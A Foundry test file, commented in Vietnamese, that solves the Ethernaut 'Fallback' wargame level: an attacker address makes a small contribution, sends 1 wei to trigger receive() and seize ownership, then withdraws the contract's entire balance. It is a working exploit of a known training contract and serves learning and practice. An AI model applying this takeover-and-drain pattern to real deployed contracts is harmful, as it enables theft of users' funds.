// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public level1;

    // Tạo 2 địa chỉ ví giả lập
    address public owner_v5 = address(0xA1);
    address public attacker = address(0xB2);

    function setUp() public {
        // Giả lập deploy contract bởi owner cũ
        vm.prank(owner_v5);
        level1 = new Fallback();

        // Cấp 1 ETH cho hacker để làm lộ phí
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        // Bắt đầu đóng vai attacker
        vm.startPrank(attacker);

        // BƯỚC 1: Đóng góp một lượng nhỏ (phải < 0.001 ETH)
        level1.contribute{value: 0.0001 ether}();
        assertEq(level1.contributions(attacker), 0.0001 ether);

        // BƯỚC 2: Gửi tiền trực tiếp để kích hoạt receive()
        // Trong Solidity, gửi data trống "" sẽ kích hoạt hàm receive
        (bool success, ) = address(level1).call{value: 1 wei}("");
        require(success, "Giao dich that bai");

        // KIỂM TRA: Attacker đã chiếm được quyền Owner chưa?
        assertEq(level1.owner(), attacker);
        console.log("Hacker da chiem quyen owner thanh cong!");

        // BƯỚC 3: Rut sach tien
        uint256 balanceBefore = attacker.balance;
        level1.withdraw();

        // KIỂM TRA: So du contract phai ve 0
        assertEq(address(level1).balance, 0);
        console.log("Hacker da rut sach tien khoi contract!");

        vm.stopPrank();
    }
}
